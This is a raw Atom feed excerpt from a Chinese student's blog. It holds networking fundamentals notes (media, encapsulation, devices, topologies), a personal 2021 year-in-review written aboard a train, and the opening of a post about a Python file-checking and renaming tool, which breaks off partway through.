&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/QMJEA9BeqSl8pxZ.png&#34; alt=&#34;19.png&#34;&gt;&amp;lt;!--p19--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;常见传输介质：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;双绞线：当今以太网最常见的传输介质，按照抗电磁干扰能力还可以分为：&lt;/p&gt;
&lt;p&gt;​		▫ STP - 屏蔽双绞线&lt;/p&gt;
&lt;p&gt;​		▫ UTP - 非屏蔽双绞线&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;光纤传输，按照功能部件可分为：&lt;/p&gt;
&lt;p&gt;​		▫ 光纤：光传输介质，简单的说，就是一根玻璃纤维，用于约束光传输的通道。&lt;/p&gt;
&lt;p&gt;​		▫ 光模块：将电信号与光信号互转的器件，产生光信号。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;串口电缆在 WAN（Wide Area Network，广域网）中大规模使用，根据 WAN 线路类型不同， 串口电缆在设备上连接的接口类型也不同：异 / 同步串口、ATM 接口、POS 接口、CE1/PRI 接口等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;无线信号的传输可以通过电磁波进行，例如：无线路由器将数据通过调制以电磁波发送出 去，移动终端的无线网卡将电磁波解调，得到数据，完成从无线路由器到移动终端的数据 传输。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/YV8QgyHL7UlOTpZ.png&#34; alt=&#34;20.png&#34;&gt;&amp;lt;!--p20--&amp;gt;&lt;/p&gt;
&lt;h2 id=&#34;数据通讯过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据通讯过程&#34;&gt;#&lt;/a&gt; 数据通讯过程&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;发送方数据封装&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/Co1DUyWthvaVQXZ.png&#34; alt=&#34;21.png&#34;&gt;&amp;lt;!--p21--&amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;假设你正在通过网页浏览器访问华为官网，当你输入完网址，敲下回车后，计算机内部会发生下列事情：
	▫ 1. IE浏览器(应用程序)调用HTTP(应用层协议)，完成应用层数据的封装(图中DATA还应包括HTTP头部，此处省略) 。
	▫ 2. HTTP依靠传输层的TCP进行数据的可靠性传输，将封装好的数据传递到TCP模块。
	▫ 3. TCP模块给应用层传递下来的Data添加上相应的TCP头部信息(源端口、目的端口等)。此时的PDU被称作Segment(段)。
	▫ 4. 在IPv4网络中，TCP模块会将封装好的Segment传递给网络层的IPv4模块(若在IPv6环境，会交给IPv6模块进行处理)。
	▫ 5. IPv4模块在收到TCP模块传递来的Segment之后，完成IPv4头部的封装，此时的PDU被称为Packet(包)。
	▫ 6. 由于使用了Ethernet作为数据链路层协议，故在IPv4模块完成封装之后，会将Packet交由数据链路层的Ethernet模块(例如以太网卡)处理。
	▫ 7. Ethernet模块在收到IPv4模块传递来的Packet之后，添加上相应的Ethernet头部信息和FCS帧尾，此时的PDU被称为Frame(帧)。
	▫ 8. 在Ethernet模块封装完毕之后，会将数据传递到物理层。
	▫ 9. 根据物理介质的不同，物理层负责将数字信号转换成电信号，光信号，电磁波(无线)信号等。
	▫ 10. 转换完成的信号在网络中开始传递
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;中间网络数据传输&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/FR7yBUjamcMoCfh.png&#34; alt=&#34;22.png&#34;&gt;&amp;lt;!--p22--&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;接受方数据解封装&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/8xZc1NPpnuXjMtK.png&#34; alt=&#34;23.png&#34;&gt;&amp;lt;!--p23--&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content>
        <category term="ICT" />
        <updated>2022-01-29T08:33:18.514Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2022/01/23/ICT/Datacom%E7%AC%94%E8%AE%B0/ICT%E7%AC%94%E8%AE%B0-%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</id>
        <title>ICT笔记-数据通信网络基础</title>
        <link rel="alternate" href="http://imfanqie.top/2022/01/23/ICT/Datacom%E7%AC%94%E8%AE%B0/ICT%E7%AC%94%E8%AE%B0-%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
        <content type="html">&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;基本概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本概念&#34;&gt;#&lt;/a&gt; 基本概念&lt;/h2&gt;
&lt;p&gt;常见图标：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/23/6mlz2ksgrvf87hB.png&#34; alt=&#34;1.png&#34;&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;网络通信基本概念：终端设备之间通过计算机网络进行的通信。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如图例：&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/23/apy8eGLsJNgXwRF.png&#34; alt=&#34;2.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;数据通信可类比快递传输：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;• 需要快递的物品：
	▫ 应用程序生成需要传递的信息 (或数据)。
• 物品被包装起来形成包裹，并粘贴含有收货人姓名、地址的快递单：
	▫ 应用程序将数据打包成原始的“数据载荷”，并添加“头部”和“尾部”形成报文，
报文中的重要信息是接收者的地址信息，即“目的地址”。
	▫ 在一个信息单元的基础上，增加一些新的信息段，使其形成一个新的信息单元，这个
过程称为“封装”。
• 包裹被送到集散中心，集散中心对包裹上的目的地址进行分检，去往同一个城市的物品被
放入同一架飞机，并飞向天空：
	▫ 报文通过网线到达“网关”，网关收到报文后，对其“解封装”，读取目的地址，再
重新封装，并根据目的地址不同，送往不同的“路由器”，通过网关及路由器的传递，
报文最终离开本地网络，进入Internet的干道进行传输。
	▫ 其中，网线所起的作用跟公路一样，它是信息传输的介质。
• 飞机抵达目的机场后，包裹被取出进行分检，去往同一地区的包裹，被送到了同一集散中
心：
	▫ 报文经过Internet干道的传输，到达目的地址所在的本地网络，本地网络的网关或路
由器对报文进行解封装和封装，并根据目的地址决定发往相应的下一台路由器，最终
到达目的计算机所在网络的网关。
• 集散中心根据包裹上的目的地址进行分检，快递员送包裹上门，收件人拆开包裹，确认物
品完好无损后收下。整个快递过程完成。
	▫ 报文到达目的计算机所在网络的网关，解封装和封装，然后根据目的地址发往相应的
计算机。计算机收到报文后，对报文进行校验处理，校验无误后，接收下报文，并将其中的数据载荷交由相应的应用程序进行处理。一次完整的网络通信过程就结束了。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;常见术语：&lt;/p&gt;
&lt;p&gt;数据载荷、报文、头部、尾部、封装、解封装、网关、路由器、终端设备。&lt;/p&gt;
&lt;p&gt;如图：&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/23/NpWiu4dsLtqzvaC.png&#34; alt=&#34;3.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;数据通信网络 (Datacom)：由路由器、交换机、防火墙、无线控制器、无线接入点，以及个人电脑、网络打印机、服务器等设备构成的通信网络。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;基本功能：实现数据互通&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;网络设备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络设备&#34;&gt;#&lt;/a&gt; 网络设备&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;交换机&lt;/p&gt;
&lt;p&gt;距离终端用户最近的设备，用于终端用户接入网络、对数据帧进行交换等。&lt;/p&gt;
&lt;p&gt;（广播域：一传多）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/23/WHjQizX2EO5ehlD.png&#34; alt=&#34;4.png&#34;&gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;路由器&lt;/p&gt;
&lt;p&gt;网络层设备，可以在因特网中进行数据报文转发。路由器根据所收到的报文的目的地址选择一条合适的路径，将报文传送到下一个路由器或目的地，路径中最后的路由器负责将报文送交目的主机。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路由器工作在 TCP/IP 模型的网络层&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/23/gOkdv3HZQSpticM.png&#34; alt=&#34;5.png&#34;&gt;&amp;lt;!--p5--&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;防火墙&lt;/p&gt;
&lt;p&gt;网络安全设备，用于控制两个网络之间的安全通信。他通过检测、限制、更爱跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的消息、结构和运维状况，以此来实现对网络安全的保护&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/23/eacuDhgKosHTr6f.png&#34; alt=&#34;6.png&#34;&gt;&amp;lt;!--p6--&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;无线设备&lt;/p&gt;
&lt;p&gt;无线局域网 WLAN 广义上是指以无线电波、激光、红外线等无线信号来代替有线局域网中 的部分或全部传输介质所构成的网络。而常见的 Wi-Fi 是指 IEEE 802.11 标准上的无线局域网 技术。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在 WLAN 中，常见的设备有胖 AP、瘦 AP 和无线控制器 AC。&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;▫ 无线接入点 (AP, Access Point)
	▪ 一般支持FAT AP、FIT AP和云管理工作模式，根据网络规划的需求，可以灵活
地在各种模式下切换。
	▪ FAT AP：适用于家庭，独立工作，需单独配置，功能较为单一，成本低。
	▪ FIT AP：适用于大中型企业，需要配合AC使用，由AC统一管理和配置，功能丰
富。
	▪ 云管理：适用于中小型企业，需要配合云管理平台使用，由云管理平台统一管
理和配置，功能丰富，即插即用。
▫ 无线接入控制器 (AC, Access Controller)
	▪ 一般位于整个网络的汇聚层，提供高速、安全、可靠的WLAN业务。
	▪ 提供大容量、高性能、高可靠性、易安装、易维护的无线数据控制业务，具有
组网灵活、绿色节能等优势。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/23/uLOknITgBqY2MQd.png&#34; alt=&#34;6.5.png&#34;&gt;&amp;lt;!--p7--&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;网络类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络类型&#34;&gt;#&lt;/a&gt; 网络类型&lt;/h2&gt;
&lt;p&gt;按照地理覆盖范围来划分，可以分为：局域网、城域网、广域网，城域网介于局域网和广域网之间。&lt;/p&gt;
&lt;p&gt;• &lt;strong&gt;局域网：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​	▫ 基本特点：&lt;/p&gt;
&lt;p&gt;​			 ▪ 覆盖范围一般在几公里之内；&lt;/p&gt;
&lt;p&gt;​			 ▪ 主要作用是把分布距离较近 (如：有一个家庭内、一座或几座大楼内、一个校园 内，等等) 的若干终端电脑连接起来。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;▫ 使用技术：以太网、Wi-Fi等。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;• &lt;strong&gt;城域网：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​	 ▫ 基本特点：&lt;/p&gt;
&lt;p&gt;​			 ▪ 城域网是较大型的局域网，需要的成本较高，但可以提供更快的传输速率。它 改进了局域网中的传输介质，扩大了局域网的访问范围，范围可以包含一个大 学校园或城市；&lt;/p&gt;
&lt;p&gt;​			 ▪ 主要作用是将同一城市内不同地点的主机、数据库以及局域网等连接起来；&lt;/p&gt;
&lt;p&gt;​			▪ 与广域网作用相似，但实现方式和性能不同。&lt;/p&gt;
&lt;p&gt;​	▫ 使用技术：基于大型的局域网，与局域网技术相似，如：以太网 (10Gbps/100Gbps)、 WiMAX (全球互通微波访问)。&lt;/p&gt;
&lt;p&gt;• &lt;strong&gt;广域网：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​	▫ 基本特点：&lt;/p&gt;
&lt;p&gt;​			 ▪ 覆盖范围一般在几公里以上，可大至几十、几百或几千公里；&lt;/p&gt;
&lt;p&gt;​			▪ 主要作用是把分布较远 (如：跨越城市、跨越国家， 等等) 的若干局域网或城域 网连接起来；&lt;/p&gt;
&lt;p&gt;​			 ▪ 会用到电信运营商的通信线路。 ▫ 使用技术：HDLC、PPP 等。&lt;/p&gt;
&lt;h2 id=&#34;网络拓扑&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络拓扑&#34;&gt;#&lt;/a&gt; 网络拓扑&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/23/9kqGcSUQ28N3nrT.png&#34; alt=&#34;7.png&#34;&gt;&amp;lt;!--p8--&amp;gt;&lt;/p&gt;
&lt;p&gt;网络拓扑是指用传输介质（例如光纤等）互连各种设备（例如计算机终端，路由器，交换机等）所呈现的结构化布局。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;按照网络的拓扑形态来划分，网络可分为 星型网络、总线型网络、环形网络、树形网络、全网状网络和部分网状网络。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/23/HZdBEPFosU5mKcO.png&#34; alt=&#34;8.png&#34;&gt;&amp;lt;!--p9--&amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;• 星型网络：
	▫ 所有节点通过一个中心节点连接在一起。
	▫ 优点：容易在网络中增加新的节点。通信数据必须经过中心节点中转，易于实现网络监控。
	▫ 缺点：中心节点的故障会影响到整个网络的通信。
• 总线型网络：
	▫ 所有节点通过一条总线（如同轴电缆）连接在一起。
	▫ 优点：安装简便，节省线缆。某一节点的故障一般不会影响到整个网络的通信。
	▫ 缺点：总线故障会影响到整个网络的通信。某一节点发出的信息可以被所有其他节点收到，安全性低。
• 环型网络：
	▫ 所有节点连成一个封闭的环形。
	▫ 优点：节省线缆。
	▫ 缺点：增加新的节点比较麻烦，必须先中断原来的环，才能插入新节点以形成新环。
• 树型网络：
	▫ 树型结构实际上是一种层次化的星型结构。
	▫ 优点：能够快速将多个星型网络连接在一起，易于扩充网络规模。
	▫ 缺点：层级越高的节点故障导致的网络问题越严重。
• 全网状网络：
	▫ 所有节点都通过线缆两两互联。
	▫ 优点：具有高可靠性和高通信效率。
	▫ 缺点：每个节点都需要大量的物理端口，同时还需要大量的互连线缆。成本高，不易扩展。
• 部分网状网络：
	▫ 只是重点节点之间才两两互连。
	▫ 优点：成本低于全网状网络。
	▫ 缺点：可靠性比全网状网络有所降低。
&lt;/code&gt;&lt;/pre&gt;
</content>
        <category term="ICT" />
        <updated>2022-01-23T11:06:17.894Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2022/01/13/2021%E6%80%BB%E7%BB%93%E9%9A%8F%E7%AC%94/</id>
        <title>2021总结随笔</title>
        <link rel="alternate" href="http://imfanqie.top/2022/01/13/2021%E6%80%BB%E7%BB%93%E9%9A%8F%E7%AC%94/"/>
        <content type="html">&lt;blockquote&gt;
&lt;p&gt;寅虎年腊月初十，岁末归途，始于新疆，路遥乏趣，遂记此文。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;写在前面：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​		本来我是没有写年总结的习惯的（一直打算写但每年到了跟前就忘），好在近日在路上朋友和我提起此事，又正好在回家路上闲来无事，火车又时不时的断网致使我无心消遣游戏，遂抽时间写下这篇总结。&lt;/p&gt;
&lt;p&gt;​		由于我的初衷只是写篇个人随笔，且某些事情我还想天马行空一下，所以写的很很很随意，麻烦且看且忘。&lt;/p&gt;
&lt;p&gt;​		不过当前，我只想说：火车真是好 ** 难受啊！！！一想想我还得做 25 小时，就很煎熬…（谁设计的这布局，上铺简直了！&lt;/p&gt;
&lt;p&gt;​		其实最无语也并不是此事，而是下车后，我该怎么回去，唉这一趟回家路啊，神仙见了也要摇头 (つд⊂)&lt;/p&gt;
&lt;p&gt;​		嗯，也不知道到了哪一站，车停了，外面一片漆黑，想想今儿险些错过火车回不了家，现在我竟有了一点欣慰，哈哈。&lt;/p&gt;
&lt;p&gt;​		借用今儿路上遇到老乡司机的一句话：你在大学习没学明白，社会关系给你整明白了……&lt;/p&gt;
&lt;p&gt;​		确实，仔细一算，今年确实没学明白啥，唉:-(&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;正文：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​		写到正文部分，我瞬间无言了，因为我也想问我，今年到底干了什么？一年结束了，仿佛和 2022 一样一片空白。&lt;/p&gt;
&lt;p&gt;​		今儿个在报纸上，我无意瞄到了一片文章：2021 的关键词是什么。文章第一句简单明了：是充满希望的一年。&lt;/p&gt;
&lt;p&gt;​		我觉得在理，可今年充满希望，到头来却让我有些失望，但尽管如此，我依旧渴望 2022 能让我实现以下愿望：&lt;br&gt;
​	1. 该死的疫情，莫要烦我了。&lt;br&gt;
​	2. 我想我该知道我所在大学的处于什么样的城市。&lt;br&gt;
​	3. 让绩点再提一提吧！&lt;br&gt;
​	4. 奖。国赛！信安大赛！冲～&lt;br&gt;
​	5. 不要安于现状，不要迷恋成就&lt;br&gt;
​	6. 能睡个好觉休息好，身体重要&lt;br&gt;
​	7. 来丶意外之财吧，满足点精神需求&lt;br&gt;
​	8. 暂时想不到了，那就祝我此行一路顺风吧。&lt;/p&gt;
&lt;p&gt;​		许久没抬头，发现车上的人已经睡了，按我推算，现在已经过了吐鲁番了，可惜在晚上，看不到风景 (｀⌒´ メ)&lt;/p&gt;
&lt;p&gt;​		也好，让我想想今年我到底干了什么！嗯……&lt;/p&gt;
&lt;p&gt;​		一月，好像还在学校考试？记得第一次考试还是有点害怕的，所以记得考的还行？害，都是大一上学期的事了！哈哈，时间好快，转眼我怎么要大二下学期了～&lt;/p&gt;
&lt;p&gt;​		二月，记得这会我貌似已经到家了，嗯，还找了份兼职！体验了一把当辅导老师的感觉，还小赚一笔，让我 “挥霍” 了一把，不过该说不说，打工人是真的苦是真的累是真的身不由己！&lt;/p&gt;
&lt;p&gt;​		三月，返校后的第一个月，一切都忙碌起来倒是没什么特殊的事情，记得我当初唯一烦的事情就是 *****（确实不想提），让我浪费了好多时间！！&lt;/p&gt;
&lt;p&gt;​		插一句，本来我是打算睡觉前写完的，结果和班主任姐姐聊了两小时，其实突然发现也不是那么无聊了哈哈哈…… 现在躺床上了，很难受。。。&lt;/p&gt;
&lt;p&gt;​		断网了， 那继续写吧！&lt;/p&gt;
&lt;p&gt;​		四月，除了课业以外，我几乎用了一整月的时间写完了 c 语言的学生管理系统，虽然简陋只有七百行，且功能只是最基本的，但我已经很欣慰和骄傲了，因为他是我第一个独立完成的系统～～&lt;/p&gt;
&lt;p&gt;​		五月，随着劳动节的小长假开始了，我为我的系统写完了一万多字的报告录制了视频，当然这都不是重要的，重要的是我已经要进入复习周了，那时的我很慌。&lt;/p&gt;
&lt;p&gt;​		六月，上半年的最后一个月，也是我最头大的月份之一，因为随着暑假的到来，期末考试也逃不掉了…… 幸好幸好，我又侥幸没挂科，尽管绩点不高，但我清楚我的所有科目都是两天速成的（甚至一天），该满足了～&lt;/p&gt;
&lt;p&gt;​		七月，暑假来了，还带来了滚滚热浪～但是再热也不能闲着，所以我选择了：考驾照。当然，暑假也得有消遣，所以我还选择了：去华山。经过详细规划，我的华山旅行很成功，天气凉爽，爬山之行完美，看到了与城市不一样的风景，使我感触颇深！顺带一提的是，七月，我开始接触了信安的专业比赛 ctf，使我受益匪浅，甚至充盈了我的整个暑假。&lt;/p&gt;
&lt;p&gt;​		八月，计划中我会和兄弟会去看场演唱会，但是现实给我当头一棒，因为这烦人的疫情，所以到今儿都很遗憾！不过幸运的是，我车技小成（哈哈哈～八月底，随着我不断的 ctf 学习，在暑假考核赛中，我成功加入了 xjusec，如此，暑假也算满足了！&lt;/p&gt;
&lt;p&gt;​		九月，开学！当然我也顺利拿到驾照，没有多花钱，这让我很满意～但是得知无法返校，又有点沮丧，ps: 当然后面我才知道我的沮丧是多余的，我应该庆幸！在课业方面，我通过网课学习，但我想说的是，真不如看视频自学，成效低微！九月底，在不断的刷 ctf 和学习中，我发现我从 web 扩展向了 crypto 和 misc……&lt;/p&gt;
&lt;p&gt;​		十月，痛苦的一个月！当我得知返校的那一刻我承认我是激动的，可为什么当我上了飞机后，西安爆发了疫情，让我白白隔离了十四天？这十四天是真的不好过，唉！不想提了，也不能提～好吧好吧，熬过去了，不过我也没闲着，除了每天水水网课以外，我还制定了详细的软著的计划与目标，并着手开始写 python 代码。此外，我还参与了 1024ctf 的出题，贡献了大部分的 crypto 和部分 misc 题，过了一把出题人的瘾～～这是一次很成功的比赛，我们都认为题很不错，切合新生也不失趣味，能引起大家的兴趣并选拔人才！当然我们也进行了赛前培训，我很紧张的进行了我第一次线上多人讲课（全程紧张的大脑空白……）！&lt;/p&gt;
&lt;p&gt;​		十一月，加倍努力！这个月终于给我放出来了！好啊好啊，终于是体会到博达了，不容易啊哈哈哈哈！但是随着每天平均 10000 步的日子，我终于是感觉到厌倦了，因为没了新奇，那就只剩累了…… 日均 1w 步，成功让我体会到了长征的日子，尤其是十一月底那大学纷飞能见度为 1 的日子，仿佛我真是到了北极 (｡í _ ì｡)。学业上，终于是恢复了我的习惯，线下确实学到了些东西，不过已经晚了唉，落下了半学期的知识…… 这个月，我写完了我的第二个软件！&lt;/p&gt;
&lt;p&gt;​		十二月，征战 and 丰收！今年我最幸运的就是在年底弥补了我一年划水以及毫无成果的事实和遗憾，也正因此，我才有底气写下这篇随笔，不然我真的没什么好记述的。十二月，经过数月的准备，我参加了新疆高校信安大赛，作为我的第一次省级比赛，很遗憾我没能拿出我的最好实力，但幸运的是，我们勉强粘上了二等奖的边，尽管不理想，但我还算欣慰吧。后来，我成功入选了学院的信安实验室，这让我的机会大大增加了，很幸运我有这个机会！再后来，我被选中获得了免费考 hcia 的机会，我很庆幸我重视了这个机会并且加以努力，幸运的我竟然通过了！可老天仿佛眷顾我，学院下发了补选自治区人民政励志奖学金的通知，我幸运的通过了班里的初选，并通过为数不多的奖项和不是很突出的绩点冲出大二大三大四的重围，排到了前十一，成功获选，这真是我无法想象的！如果说幸运是什么，怕就是十二的我了，哈哈哈哈哈～&lt;/p&gt;
&lt;p&gt;​		至此，这就是我这曲折离奇跌宕起伏的一年。如今已是 22 年一月，新的一年已经开始，但我认为 21 年的故事还没有结束。&lt;/p&gt;
&lt;p&gt;​		为什么这么说？因为这一年的故事不该只有我，尽管我并非取得了什么大的成绩或是彻底结束了一段什么特殊的日子，但这一年我总会记住很多人很多特殊的事，若是忘记，实属罪过。&lt;/p&gt;
&lt;p&gt;​		从简来说，除去亲人以外，这一年我很感谢几个对我帮助很大的人，我想我不该忘记：首先是我那可爱的班主任姐姐，她在学习上给予我不少精神力量与支持，在科学创新上让我走得更远，也接触到更多机会。平日里有困难有人分享，心烦时能帮我排忧解难，虽然有时不回我话，但我还是很开心，毕竟谁不想有一个年轻的大学班主任姐姐呢～其次要感谢给我很多机会的老师，比如刘老师杨老师等，让我能在自己的兴趣爱好上走得更远～然后还要感谢 xjusec 的学长和朋友们，让我能在比赛上有所付出有所收获，让我对学习感兴趣～最后感谢所有的代课老师和同学，相信已经不言而喻了～最后还有一句话还请不要让我挂科捞我上去！&lt;/p&gt;
&lt;p&gt;​		不对，我也许还要感谢一下自己，毕竟不管是勤劳的我还是幸运的我，最终结果还是较为满意的，这一年，我收获了很多我学到了很多专业知识，我明确了未来的发展计划目标并正在前进的路上，因为我所获得的知识和成就让我安心，我正在走向自己心中的目标。而我要加快步伐，做的更好，同时不骄不馁，走稳每一步！&lt;/p&gt;
&lt;p&gt;​		我想是时候贴一点照片纪念一下这不平凡的一年了，hhh&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/18/cRGnZDah2ANzXJP.png&#34; alt=&#34;Notepad_202201172239_17637.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;春：打工时&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/18/iXD3juAZRtcyMkB.png&#34; alt=&#34;Notepad_202201172239_30164.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;夏：华山顶&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/18/uSRpJUWswDnza4o.png&#34; alt=&#34;Notepad_202201172239_35629.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;秋：去博达&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/18/YH1X2cFiSTPnGoM.png&#34; alt=&#34;Notepad_202201172239_23526.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;冬：大雪&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;写在最后：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​		照片选的很随意，因为我懒得找了，这一年这么多记忆，怎么可能用四张照片概括呢？罢了罢了，看看表，不知不觉已是一点多了，也该就寝了！&lt;/p&gt;
&lt;p&gt;​		此段记于 1:30，在火车上的我辗转反侧（其实翻不了身）真是难眠啊！此时已过哈密，想想明天晚上就能到西安了，甚是激动哈哈哈哈哈哈&lt;/p&gt;
&lt;p&gt;​		其实我做的以及我想记录的远不止与此，闭眼睛的这一会我又想起了很多事，但我懒得加进去了，那索性就让这些事抛之脑后吧。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“岁末已致，愿来年，有趣有盼，福气不止，路途尚未结束，收拾心情，继续前行。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Fanqie&lt;br&gt;
2022 年 1 月 13 日&lt;br&gt;
写于归途火车 Z294 上&lt;/p&gt;
&lt;p&gt;此致&lt;/p&gt;
</content>
        <category term="随笔" />
        <updated>2022-01-13T08:08:07.571Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/12/01/program/py/pysolve/chre1.0/</id>
        <title>chre1.0</title>
        <link rel="alternate" href="http://imfanqie.top/2021/12/01/program/py/pysolve/chre1.0/"/>
        <content type="html">&lt;p&gt;项目：check and rename 1.0&lt;/p&gt;
&lt;p&gt;作者：Fanqie&lt;/p&gt;
&lt;p&gt;最后时间：2021.11.30&lt;/p&gt;
&lt;p&gt;功能：通过 excel 实现对文件的查缺和统一改名&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;div class=&#34;note info&#34;&gt;
&lt;p&gt;本文及文中代码未经允许禁止私自转载或使用！&lt;/p&gt;
&lt;/div&gt;
&lt;h1 id=&#34;background&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#background&#34;&gt;#&lt;/a&gt; Background&lt;/h1&gt;
&lt;p&gt;我认为编程的初衷就是为了解决学术或生活上一些难题或麻烦的事，根据自身的需求去定制代码，会为工作带来了极大的便利。所以在我经历了不少的的苦头后，就萌生了写这个工具的想法。&lt;/p&gt;
&lt;p&gt;实话说，当学委太累了（经常要收作业，收作业中间又会产生很多问题），so 专门花了几天时间写了这个软件，算是让自己偷个懒吧～～&lt;/p&gt;
&lt;p&gt;同时也希望这个工具（不仅是用来收作业）能帮到更多的人（&lt;strong&gt;一劳永逸&lt;/strong&gt;），毕竟谁不想偷懒呢？！！&lt;/p&gt;
&lt;div class=&#34;note primary&#34;&gt;
&lt;p&gt;&lt;strong&gt;顺便一提：版本号本来是不准备加的，但是工具的代码有漏洞和缺陷（见后文），以后闲了我会不断抽时间完善，所以加上了版本号&lt;/strong&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;h1 id=&#34;target&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#target&#34;&gt;#&lt;/a&gt; Target&lt;/h1&gt;
&lt;p&gt;总结一下，我认为它解决了以下的问题（帮我偷懒）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;解决了每次收过来的作业格式乱七八糟，强迫症很难受&lt;/li&gt;
&lt;li&gt;解决了每次因为缺人导致的作业收不齐&lt;/li&gt;
&lt;li&gt;解决了不知道是不是有漏收作业（在对方交了的情况下）&lt;/li&gt;
&lt;li&gt;解决了老师所要求的格式不符问题&lt;/li&gt;
&lt;li&gt;大大减少了每次收作业的时间（不止是作业）&lt;/li&gt;
